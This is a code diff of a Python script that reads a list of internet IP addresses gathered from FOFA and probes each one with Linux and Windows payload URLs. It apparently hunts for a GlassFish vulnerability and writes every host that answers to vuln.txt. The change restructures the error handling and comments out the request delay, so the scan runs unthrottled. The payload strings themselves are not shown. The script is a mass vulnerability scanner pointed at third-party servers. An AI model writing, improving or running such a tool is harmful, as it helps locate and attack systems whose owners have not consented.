@@ -11,10 +11,11 @@ for ip in open('glassfish_fofa_scan/fofa_ips.txt'):
     try:
         linux_code = requests.get(ip + payload_linux).status_code
         win_code = requests.get(ip + payload_win).status_code
-    except Exception as e:
-        continue
 
-    if linux_code == 200 or win_code == 200:
-        with open(r'vuln.txt', 'a+') as f:
-            f.write(ip)
-    time.sleep(0.5)
+
+        if linux_code == 200 or win_code == 200:
+            with open(r'glassfish_fofa_scan/vuln.txt', 'a+') as f:
+                f.write(ip + '\n')
+    except Exception as e:
+        pass
+    # time.sleep(0.5)
